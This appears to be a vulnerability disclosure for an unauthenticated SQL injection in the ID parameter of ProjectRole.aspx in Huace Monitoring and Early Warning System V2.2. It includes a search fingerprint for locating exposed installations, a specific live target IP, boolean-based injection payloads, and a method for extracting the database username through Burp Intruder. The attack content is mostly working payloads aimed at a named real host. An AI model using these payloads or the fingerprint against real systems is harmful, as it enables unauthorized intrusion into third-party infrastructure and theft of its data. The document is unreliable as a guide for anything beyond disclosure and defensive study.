Hunter:

```
body="App_Themes/Flat/Login/backgroundEn.png"
```
<img width="1274" height="598" alt="image" src="https://github.com/user-attachments/assets/abf05cf1-5752-4206-ab58-0a23c87ed6b3" />

Title:

```
Unauthenticated SQL injection vulnerability exists in version 2.2 of Huace Monitoring and Early Warning System.
```

Interface:
```
/Web/SysManage/ProjectRole.aspx
```

Vendor Homepage:

```
https://www.huace.cn/
```

Version: 

```
V2.2
```

Tested on: 

```
ASPX
```

Affected Page:

Target:

```
http://124.71.143.18:8001/
```

Route:
```
/Web/SysManage/ProjectRole.aspx?&ID=1
```

Details：

```
The ID parameter of the ProjectRole.aspx file in version 2.2 of the Huace Monitoring and Early Warning System. This vulnerability arises because the parameter is directly concatenated into SQL queries without input sanitization or the use of parameterized statements, allowing attackers to manipulate query logic and potentially bypass authentication.
```


Proof of vulnerability:


Payload:

'+or+'a'='a  

When entering +'or'a'='a, a 302 redirect response is returned.

<img width="416" height="222" alt="image" src="https://github.com/user-attachments/assets/b30ad663-7717-4347-a735-da4ea50cb959" />


'+or+'a'='b

When entering 'or'a'='b, a 200 status code is returned, and there is a difference in content length.

<img width="416" height="206" alt="image" src="https://github.com/user-attachments/assets/03c7fb54-f22f-4959-ba47-21fe0cde0e3d" />



payload： '+or+current_user+like+'a% 

Through the aforementioned differential response, attempt to send to the Intruder module of BurpSuite to obtain the database username..
<img width="416" height="364" alt="image" src="https://github.com/user-attachments/assets/a8f6fbab-b633-41fb-b2da-5a4a6690328e" />



